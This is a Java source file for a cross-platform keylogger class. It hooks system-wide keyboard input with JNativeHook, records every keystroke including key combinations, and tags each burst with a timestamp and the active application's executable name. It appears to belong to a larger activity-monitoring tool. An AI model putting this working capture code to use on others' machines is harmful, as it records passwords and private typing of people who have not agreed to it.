package com.acs;

import com.sun.jna.Native;
import com.sun.jna.platform.win32.*;
import com.sun.jna.platform.unix.X11;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.ptr.NativeLongByReference;
import com.sun.jna.ptr.PointerByReference;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.NativeInputEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;


import java.io.BufferedReader;
import java.io.FileReader;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.*;
import java.util.function.Consumer;
import java.util.logging.Level;

public class KeyLogger implements NativeKeyListener {

    private static final DateTimeFormatter TIME_FMT =
            DateTimeFormatter.ofPattern("dd-MM-yyyy_HH-mm-ss HH:mm:ss");
    private static final long IDLE_MS = 2000;
    private static final long POLL_MS = 500;

    private final Consumer<String> onFlush;

    private final Object bufferLock = new Object();
    private final StringBuilder buffer = new StringBuilder();

    private volatile String burstApp = "unknown";
    private volatile String burstTime = "";
    private volatile long lastKeystrokeTime = 0;

    private volatile String currentApp = "unknown";
    private volatile boolean running = false;

    private volatile boolean capsLockOn = false;

    private ScheduledExecutorService scheduler;
    private Thread pollerThread;

    public KeyLogger(Consumer<String> onFlush) {
        this.onFlush = onFlush;
    }

    // Track if GlobalScreen hook has been registered for this JVM session
    // registerNativeHook() must only be called once — calling it again after
    // unregisterNativeHook() is unreliable in JNativeHook
    private static volatile boolean hookRegistered = false;

    public void start() throws NativeHookException {
        running = true;

        java.util.logging.Logger jnhLogger =
                java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        jnhLogger.setLevel(Level.WARNING);
        jnhLogger.setUseParentHandlers(false);

        pollerThread = new Thread(this::pollActiveApp, "KeylogAppPoller");
        pollerThread.setDaemon(true);
        pollerThread.start();

        scheduler = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "KeylogIdleFlusher");
            t.setDaemon(true);
            return t;
        });

        scheduler.scheduleAtFixedRate(this::checkIdleFlush, POLL_MS, POLL_MS, TimeUnit.MILLISECONDS);

        // Only register the native hook once per JVM session
        // On reconnect we just re-add the listener — hook stays registered
        if (!hookRegistered) {
            GlobalScreen.registerNativeHook();
            hookRegistered = true;
        }
        GlobalScreen.addNativeKeyListener(this);

        System.out.println("[KeyLogger] Started — platform: " + osName());
    }

    public void stop() {
        if (!running) return;
        running = false;

        String remaining = drainBuffer();
        if (remaining != null) onFlush.accept(remaining);

        // Only remove the listener — do NOT unregister the hook
        // Unregistering and re-registering in the same JVM is unreliable in JNativeHook
        // Hook stays alive for the entire JVM session
        GlobalScreen.removeNativeKeyListener(this);

        if (scheduler != null) scheduler.shutdownNow();
        if (pollerThread != null) pollerThread.interrupt();

        System.out.println("[KeyLogger] Stopped");
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        if (!running) return;

        if ((e.getModifiers() & (NativeInputEvent.CTRL_MASK |
                NativeInputEvent.ALT_MASK |
                NativeInputEvent.META_MASK)) != 0) {
            return;
        }

        char c = e.getKeyChar();

        if (c == NativeKeyEvent.CHAR_UNDEFINED) return;
        if (c < 32 || c == 127) return;

        boolean shift = (e.getModifiers() & NativeInputEvent.SHIFT_MASK) != 0;

        if (Character.isLetter(c)) {
            if (capsLockOn ^ shift) {
                c = Character.toUpperCase(c);
            } else {
                c = Character.toLowerCase(c);
            }
        }

        synchronized (bufferLock) {
            if (buffer.length() == 0) {
                burstApp = currentApp;
                burstTime = LocalDateTime.now().format(TIME_FMT);
            }

            lastKeystrokeTime = System.currentTimeMillis();
            buffer.append(c);
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        if (!running) return;

        int code = e.getKeyCode();

        if (code == NativeKeyEvent.VC_CAPS_LOCK) {
            capsLockOn = !capsLockOn;
            return;
        }

        if (isModifierOnly(code)) return;

        int mods = e.getModifiers();

        boolean shift = (mods & NativeInputEvent.SHIFT_MASK) != 0;
        boolean ctrl = (mods & NativeInputEvent.CTRL_MASK) != 0;
        boolean alt = (mods & NativeInputEvent.ALT_MASK) != 0;
        boolean meta = (mods & NativeInputEvent.META_MASK) != 0;

        boolean isEnter = code == NativeKeyEvent.VC_ENTER;

        String token;

        if (ctrl || alt || meta) {
            token = buildComboToken(code, shift, ctrl, alt, meta);
        }
        else if (isEnter) {
            token = "[ENTER]";
        }
        else if (isKnownNonPrintable(code)) {
            String name = specialName(code, shift);
            token = name.equals(" ") ? " " : "[" + name + "]";
        }
        else {
            return;
        }

        String lineToFlush = null;

        synchronized (bufferLock) {

            if (buffer.length() == 0) {
                burstApp = currentApp;
                burstTime = LocalDateTime.now().format(TIME_FMT);
            }

            lastKeystrokeTime = System.currentTimeMillis();
            buffer.append(token);

            if (isEnter) lineToFlush = buildLine();
        }

        if (lineToFlush != null) onFlush.accept(lineToFlush);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {}

    private static boolean isModifierOnly(int code) {

        String text = NativeKeyEvent.getKeyText(code).toLowerCase();

        if (text.contains("shift") ||
                text.contains("control") ||
                text.equals("ctrl") ||
                text.contains("alt") ||
                text.contains("meta") ||
                text.contains("windows") ||
                text.contains("command") ||
                text.contains("altgraph"))
            return true;

        return code == 16 || code == 17 || code == 18 ||
                code == 91 || code == 92 ||
                code == 160 || code == 161 ||
                code == 162 || code == 163 ||
                code == 164 || code == 165;
    }

    private static boolean isKnownNonPrintable(int code) {

        if (functionKeyName(code) != null) return true;

        return switch (code) {
            case NativeKeyEvent.VC_BACKSPACE,
                    NativeKeyEvent.VC_TAB,
                    NativeKeyEvent.VC_ESCAPE,
                    NativeKeyEvent.VC_DELETE,
                    NativeKeyEvent.VC_INSERT,
                    NativeKeyEvent.VC_HOME,
                    NativeKeyEvent.VC_END,
                    NativeKeyEvent.VC_PAGE_UP,
                    NativeKeyEvent.VC_PAGE_DOWN,
                    NativeKeyEvent.VC_UP,
                    NativeKeyEvent.VC_DOWN,
                    NativeKeyEvent.VC_LEFT,
                    NativeKeyEvent.VC_RIGHT,
                    NativeKeyEvent.VC_PRINTSCREEN,
                    NativeKeyEvent.VC_SCROLL_LOCK,
                    NativeKeyEvent.VC_PAUSE,
                    NativeKeyEvent.VC_NUM_LOCK,
                    NativeKeyEvent.VC_MEDIA_PLAY,
                    NativeKeyEvent.VC_MEDIA_STOP,
                    NativeKeyEvent.VC_MEDIA_PREVIOUS,
                    NativeKeyEvent.VC_MEDIA_NEXT,
                    NativeKeyEvent.VC_VOLUME_MUTE,
                    NativeKeyEvent.VC_VOLUME_UP,
                    NativeKeyEvent.VC_VOLUME_DOWN -> true;
            default -> false;
        };
    }

    private static String buildComboToken(int code, boolean shift,
                                          boolean ctrl, boolean alt, boolean meta) {

        String base = comboBase(code, shift);

        StringBuilder sb = new StringBuilder("[");

        if (meta) sb.append("Win+");
        if (ctrl) sb.append("Ctrl+");
        if (alt) sb.append("Alt+");
        if (shift && !isLetter(code)) sb.append("Shift+");

        sb.append(base).append("]");

        return sb.toString();
    }

    private static boolean isLetter(int code) {
        String text = NativeKeyEvent.getKeyText(code);
        return text.length() == 1 && Character.isLetter(text.charAt(0));
    }

    private static String comboBase(int code, boolean shift) {

        String text = NativeKeyEvent.getKeyText(code);

        if (text.length() == 1 && Character.isLetterOrDigit(text.charAt(0))) {
            return text.toUpperCase();
        }

        String fn = functionKeyName(code);
        if (fn != null) return fn;

        return specialName(code, shift);
    }

    private static String functionKeyName(int code) {

        return switch (code) {
            case NativeKeyEvent.VC_F1 -> "F1";
            case NativeKeyEvent.VC_F2 -> "F2";
            case NativeKeyEvent.VC_F3 -> "F3";
            case NativeKeyEvent.VC_F4 -> "F4";
            case NativeKeyEvent.VC_F5 -> "F5";
            case NativeKeyEvent.VC_F6 -> "F6";
            case NativeKeyEvent.VC_F7 -> "F7";
            case NativeKeyEvent.VC_F8 -> "F8";
            case NativeKeyEvent.VC_F9 -> "F9";
            case NativeKeyEvent.VC_F10 -> "F10";
            case NativeKeyEvent.VC_F11 -> "F11";
            case NativeKeyEvent.VC_F12 -> "F12";
            default -> null;
        };
    }

    private static String specialName(int code, boolean shift) {

    String fn = functionKeyName(code);
    if (fn != null) return fn;

    return switch (code) {

        case NativeKeyEvent.VC_BACKSPACE      -> "BKSP";
        case NativeKeyEvent.VC_TAB            -> shift ? "Shift+TAB" : "TAB";
        case NativeKeyEvent.VC_ESCAPE         -> "ESC";
        case NativeKeyEvent.VC_SPACE          -> " ";
        case NativeKeyEvent.VC_DELETE         -> "DEL";
        case NativeKeyEvent.VC_INSERT         -> "INS";
        case NativeKeyEvent.VC_HOME           -> "Home";
        case NativeKeyEvent.VC_END            -> "End";
        case NativeKeyEvent.VC_PAGE_UP        -> "PgUp";
        case NativeKeyEvent.VC_PAGE_DOWN      -> "PgDn";
        case NativeKeyEvent.VC_UP             -> "Up";
        case NativeKeyEvent.VC_DOWN           -> "Down";
        case NativeKeyEvent.VC_LEFT           -> "Left";
        case NativeKeyEvent.VC_RIGHT          -> "Right";

        case NativeKeyEvent.VC_PRINTSCREEN    -> "PrtSc";
        case NativeKeyEvent.VC_SCROLL_LOCK    -> "ScrLk";
        case NativeKeyEvent.VC_PAUSE          -> "Pause";
        case NativeKeyEvent.VC_NUM_LOCK       -> "NumLk";

        case NativeKeyEvent.VC_MEDIA_PLAY     -> "Play";
        case NativeKeyEvent.VC_MEDIA_STOP     -> "Stop";
        case NativeKeyEvent.VC_MEDIA_PREVIOUS -> "Prev";
        case NativeKeyEvent.VC_MEDIA_NEXT     -> "Next";

        case NativeKeyEvent.VC_VOLUME_MUTE    -> "Mute";
        case NativeKeyEvent.VC_VOLUME_UP      -> "VolUp";
        case NativeKeyEvent.VC_VOLUME_DOWN    -> "VolDn";

        case NativeKeyEvent.VC_EQUALS         -> "[KP_=]";
        case NativeKeyEvent.VC_MINUS          -> "[KP_-]";
        case NativeKeyEvent.VC_SLASH          -> "[KP_/]";
        case NativeKeyEvent.VC_PERIOD        -> ".";

        default -> "Key_" + code;
    };
}

    private void checkIdleFlush() {

        if (!running) return;

        String line = null;

        synchronized (bufferLock) {

            if (buffer.length() > 0 &&
                    lastKeystrokeTime > 0 &&
                    System.currentTimeMillis() - lastKeystrokeTime >= IDLE_MS) {

                line = buildLine();
            }
        }

        if (line != null) onFlush.accept(line);
    }

    private String buildLine() {

        if (buffer.length() == 0) return null;

        String line = "[" + burstTime + "] [" + burstApp + "] " + buffer;

        buffer.setLength(0);
        lastKeystrokeTime = 0;

        return line;
    }

    private String drainBuffer() {
        synchronized (bufferLock) {
            return buildLine();
        }
    }

    private void pollActiveApp() {

        while (running && !Thread.currentThread().isInterrupted()) {

            try {

                String app = resolveActiveApp();

                if (!app.equals(currentApp)) {

                    String line;

                    synchronized (bufferLock) {
                        line = buildLine();
                    }

                    if (line != null) onFlush.accept(line);

                    currentApp = app;
                }

                Thread.sleep(POLL_MS);

            } catch (InterruptedException e) {
                break;
            }
        }
    }

    private static String resolveActiveApp() {

        try {
            return osName().contains("win")
                    ? activeAppWindows()
                    : activeAppLinux();
        }
        catch (Exception e) {
            return "unknown";
        }
    }

    private static String activeAppWindows() {

        try {

            WinDef.HWND hwnd = User32.INSTANCE.GetForegroundWindow();

            if (hwnd == null) return "unknown";

            IntByReference pid = new IntByReference();

            User32.INSTANCE.GetWindowThreadProcessId(hwnd, pid);

            WinNT.HANDLE proc = Kernel32.INSTANCE.OpenProcess(
                    WinNT.PROCESS_QUERY_INFORMATION | WinNT.PROCESS_VM_READ,
                    false,
                    pid.getValue()
            );

            if (proc == null) return "unknown";

            char[] path = new char[1024];

            Psapi.INSTANCE.GetModuleFileNameExW(proc, null, path, 1024);

            Kernel32.INSTANCE.CloseHandle(proc);

            String full = Native.toString(path).trim();

            if (full.isEmpty()) return "unknown";

            int sep = Math.max(full.lastIndexOf('\\'), full.lastIndexOf('/'));

            return sep >= 0 ? full.substring(sep + 1) : full;

        } catch (Exception e) {
            return "unknown";
        }
    }

    // ── X11Extended — redefines XGetWindowProperty with long params (not NativeLong)
    // Same pattern as LinuxActivityLogger — fixes the int/NativeLong mismatch error
    private interface X11Extended extends com.sun.jna.platform.unix.X11 {
        X11Extended INSTANCE = Native.load("X11", X11Extended.class);

        int XGetWindowProperty(Display display, Window w, Atom property,
                long long_offset, long long_length, boolean delete,
                Atom req_type, AtomByReference actual_type_return,
                IntByReference actual_format_return,
                NativeLongByReference nitems_return,
                NativeLongByReference bytes_after_return,
                PointerByReference prop_return);
    }

    private static String activeAppLinux() {
        try {
            X11Extended x11     = X11Extended.INSTANCE;
            X11.Display display = x11.XOpenDisplay(null);
            if (display == null) return "unknown";

            try {
                X11.Window root          = x11.XDefaultRootWindow(display);
                X11.Atom netActiveWindow = x11.XInternAtom(display, "_NET_ACTIVE_WINDOW", false);
                X11.Atom netWmPid        = x11.XInternAtom(display, "_NET_WM_PID",        false);

                X11.AtomByReference   actualType   = new X11.AtomByReference();
                IntByReference        actualFormat = new IntByReference();
                NativeLongByReference nItems       = new NativeLongByReference();
                NativeLongByReference bytesAfter   = new NativeLongByReference();
                PointerByReference    prop         = new PointerByReference();

                // Get active window
                x11.XGetWindowProperty(display, root, netActiveWindow, 0, 1, false,
                        X11.XA_WINDOW, actualType, actualFormat, nItems, bytesAfter, prop);

                if (prop.getValue() == null) return "unknown";
                X11.Window activeWindow = new X11.Window(prop.getValue().getLong(0));
                x11.XFree(prop.getValue());
                if (activeWindow.longValue() == 0) return "unknown";

                // Get PID from window
                prop = new PointerByReference();
                x11.XGetWindowProperty(display, activeWindow, netWmPid, 0, 1, false,
                        X11.XA_CARDINAL, actualType, actualFormat, nItems, bytesAfter, prop);

                if (prop.getValue() == null) return "unknown";
                int pid = prop.getValue().getInt(0);
                x11.XFree(prop.getValue());
                if (pid <= 0) return "unknown";

                // Get exe name from /proc — same as LinuxActivityLogger
                try {
                    String exePath = new java.io.File("/proc/" + pid + "/exe").getCanonicalPath();
                    int sep = exePath.lastIndexOf('/');
                    return sep >= 0 ? exePath.substring(sep + 1) : exePath;
                } catch (Exception e) {
                    try (BufferedReader br = new BufferedReader(
                            new FileReader("/proc/" + pid + "/cmdline"))) {
                        String cmd = br.readLine();
                        if (cmd != null) {
                            String exe = cmd.split("\0")[0];
                            int sep = exe.lastIndexOf('/');
                            return sep >= 0 ? exe.substring(sep + 1) : exe;
                        }
                    } catch (Exception ignored) {}
                }
            } finally {
                x11.XCloseDisplay(display);
            }
        } catch (Exception ignored) {}
        return "unknown";
    }

    private static String osName() {
        return System.getProperty("os.name").toLowerCase();
    }
}